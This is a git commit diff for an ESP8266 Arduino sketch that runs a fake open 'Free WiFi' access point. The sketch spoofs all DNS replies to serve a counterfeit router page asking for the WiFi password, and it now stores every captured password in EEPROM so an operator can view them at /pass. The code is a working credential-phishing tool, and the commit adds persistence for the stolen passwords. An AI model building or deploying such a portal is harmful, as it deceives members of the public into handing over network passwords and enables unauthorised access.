3e2a6e1ea298c51ad136170f9cabf7f2a22637cb
Alpha-1729 <anilakskumar1729@gmail.com>
2020-08-19 19:07:10 +0500

    Added password storage in EEPROM

--- WiFi_Captive_Portal.ino
+++ WiFi_Captive_Portal.ino
@@ -3,12 +3,12 @@
 
 // Libraries
 #include <ESP8266WiFi.h>
-#include <DNSServer.h> 
+#include <DNSServer.h>
 #include <ESP8266WebServer.h>
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Free WiFi";
+const char *SSID_NAME = "Free WiFi";
 
 // Default main strings
 #define SUBTITLE "Router info."
@@ -19,7 +19,7 @@ const char* SSID_NAME = "Free WiFi";
 #define PASS_TITLE "Passwords"
 #define CLEAR_TITLE "Cleared"
 
-// Init system settings
+// Init system settings`
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
@@ -29,59 +29,125 @@ String allPass = "";
 String newSSID = "";
 String currentSSID = "";
 
-unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
-DNSServer dnsServer; ESP8266WebServer webServer(80);
+// For storing passwords in EEPROM.
+int passStart = 20; // Starting location to save password.
+int passEnd=20; // Ending location to save password.
+String singlePassword=""; // For storing each password.
 
-String input(String argName) {
+unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+
+String input(String argName)
+{
   String a = webServer.arg(argName);
-  a.replace("<","&lt;");a.replace(">","&gt;");
-  a.substring(0,200); return a; }
+  a.replace("<", "&lt;");
+  a.replace(">", "&gt;");
+  a.substring(0, 200);
+  return a;
+}
 
-String footer() { 
+String footer()
+{
   return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
 }
 
-String header(String t) {
+String header(String t)
+{
   String a = String(currentSSID);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
-    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-    "div { padding: 0.5em; }"
-    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
-    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
-    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-    "textarea { width: 100%; }";
+  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
+               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+               "div { padding: 0.5em; }"
+               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
+               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
+               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
+               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
+               "textarea { width: 100%; }";
   String h = "<!DOCTYPE html><html>"
-    "<head><title>" + a + " :: " + t + "</title>"
-    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-    "<style>" + CSS + "</style>"
-    "<meta charset=\"UTF-8\"></head>"
-    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
-  return h; }
-
-String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>"+
-    "<input type=password name=m></input><input type=submit value=Start></form>" + footer();
+             "<head><title>" +
+             a + " :: " + t + "</title>"
+                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
+                              "<style>" +
+             CSS + "</style>"
+                   "<meta charset=\"UTF-8\"></head>"
+                   "<body><nav><b>" +
+             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+  return h;
 }
 
-String posted() {
-  String pass = input("m"); allPass = "<li><b>" + pass + "</b></li>" + allPass;
+String index()
+{
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>" +
+         "<input type=password name=m></input><input type=submit value=Start></form>" + footer();
+}
+
+String posted()
+{
+  String pass = input("m");
+  singlePassword = "---" + pass;  // For separating passwords.
+
+  // Writing each passwords to EEPROM.
+  for (int i=0;i<=singlePassword.length();++i)
+  {
+    EEPROM.write(i + passEnd, singlePassword[i]);
+  }
+  passEnd += singlePassword.length(); // Updating password end position in EEPROM.
+  EEPROM.write(passEnd, '\0');
+  EEPROM.commit();
   return header(POST_TITLE) + POST_BODY + footer();
 }
 
-String pass() {
+String pass()
+{
+  allPass = "";
+  int flag = 0;
+  int i = passStart;  // Password start position in EEPROM.
+
+  // Reading Saved Password from EEPROM.
+  while (EEPROM.read(i) != '\0')
+  {    
+    if (EEPROM.read(i) == '-' && EEPROM.read(i+1) == '-' && EEPROM.read(i+2) == '-')
+    {
+      i += 3;
+      if (flag == 0)
+      {
+        allPass += "<li><b>";
+      }
+      else
+      {
+        allPass += "</b></li><li><b>";
+        flag = 0;
+      }
+    }
+    else
+    {
+      allPass += char(EEPROM.read(i));
+      i++;
+      flag = 1;
+    }
+    
+  }
+  if (flag == 1)
+  {
+    allPass += "</b></li>";
+  }
+
   return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
 
-String ssid() {
-  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
-    "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
+String ssid()
+{
+  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
+         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
 }
 
-String postedSSID() {
-  String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
-  for (int i = 0; i < postedSSID.length(); ++i) {
+String postedSSID()
+{
+  String postedSSID = input("s");
+  newSSID = "<li><b>" + postedSSID + "</b></li>";
+  for (int i = 0; i < postedSSID.length(); ++i)
+  {
     EEPROM.write(i, postedSSID[i]);
   }
   EEPROM.write(postedSSID.length(), '\0');
@@ -89,14 +155,21 @@ String postedSSID() {
   WiFi.softAP(postedSSID);
 }
 
-String clear() {
-  String pass = ""; allPass = "";
+String clear()
+{
+  String pass = "";
+  allPass = "";
+  // Marking the passowrd end location.
+  EEPROM.write(passStart,'\0') ;
+  EEPROM.commit();
   return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
-void BLINK() { // The built-in LED will blink 5 times after a password is posted.
+void BLINK()
+{ // The built-in LED will blink 5 times after a password is posted.
   int count = 0;
-  while(count < 5){
+  while (count < 5)
+  {
     digitalWrite(BUILTIN_LED, LOW);
     delay(500);
     digitalWrite(BUILTIN_LED, HIGH);
@@ -105,41 +178,52 @@ void BLINK() { // The built-in LED will blink 5 times after a password is posted
   }
 }
 
-void setup() {
+void setup()
+{
   // Serial begin
   Serial.begin(115200);
-  
+
   bootTime = lastActivity = millis();
   EEPROM.begin(512);
   delay(10);
-  
+
   // Read EEPROM SSID
   String ESSID;
   int i = 0;
-  while (EEPROM.read(i) != '\0') {
+  while (EEPROM.read(i) != '\0')
+  {
     ESSID += char(EEPROM.read(i));
     i++;
   }
-  
+
+  // Reading the end position of password in the EEPROM.
+  while (EEPROM.read(passEnd) != '\0')
+  {
+    passEnd++;
+  }
+
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
 
   // Check if EEPROM SSID is empty
-  if ( ESSID.length() > 1 ) {
+  if (ESSID.length() > 1)
+  {
     currentSSID = ESSID.c_str(); // Else, use the EEPROM SSID
-  } else {
+  }
+  else
+  {
     currentSSID = SSID_NAME; // If it's empty, use the default SSID
   }
   Serial.print("SSID: ");
-  WiFi.softAP(currentSSID);  
+  WiFi.softAP(currentSSID);
 
   // Start webserver
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
-  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
-  webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
-  webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
-  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
-  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
+  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
+  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
+  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
+  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
+  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
   webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
   webServer.begin();
 
@@ -148,7 +232,12 @@ void setup() {
   digitalWrite(BUILTIN_LED, HIGH);
 }
 
-
-void loop() { 
-  if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
-dnsServer.processNextRequest(); webServer.handleClient(); }
+void loop()
+{
+  if ((millis() - lastTick) > TICK_TIMER)
+  {
+    lastTick = millis();
+  }
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+}
